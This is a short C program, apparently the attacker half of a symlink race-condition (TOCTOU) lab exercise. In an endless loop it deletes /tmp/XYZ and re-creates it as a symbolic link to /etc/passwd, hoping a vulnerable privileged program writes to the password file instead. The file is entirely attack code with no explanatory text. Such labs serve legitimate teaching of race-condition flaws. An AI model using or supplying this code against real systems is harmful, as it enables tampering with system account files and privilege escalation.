#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

 int attack(void)
 {

    const char *source = "/tmp/XYZ";
    const char *destination = "/etc/passwd";
    
    unlink(source);
    symlink(destination, source);

     return 1;
 }

int main(int argc, char*argv[])
{

     while (true){ 
     	attack();
     }

    return 0;
 }

